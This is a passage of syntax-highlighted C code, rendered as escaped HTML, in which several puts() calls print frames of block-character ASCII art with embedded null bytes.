&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> 